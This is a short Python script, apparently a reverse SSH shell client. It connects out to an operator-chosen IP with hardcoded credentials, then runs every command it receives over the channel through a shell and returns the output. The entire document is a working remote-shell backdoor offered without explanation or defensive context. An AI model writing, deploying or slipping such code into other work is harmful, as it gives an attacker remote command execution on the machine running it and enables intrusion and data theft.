import paramiko
import threading
import subprocess
import sys

def ssh_command(ip, user, passwd, command):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(ip, username=user, password=passwd)
	
	except paramiko.ssh_exception.AuthenticationException:
		print('[-] Invalid Credentials')
		sys.exit(1)
	
	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		ssh_session.send(command)
		print(ssh_session.recv(1024).decode())
		while True:
			command = ssh_session.recv(1024)
			if command.decode() == 'exit':
				print("[-] Session Closed")
				sys.exit(1)
			
			try:
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			
			except Exception:
				ssh_session.send(str(Exception))
		
		client.close()
	
	return

def main():
	ip = input('Enter IP Address: ')
	uname = "grub"
	pname = "a1b2c3d4"
	ssh_command(ip, uname, pname, '[+] Client Connected')

main()
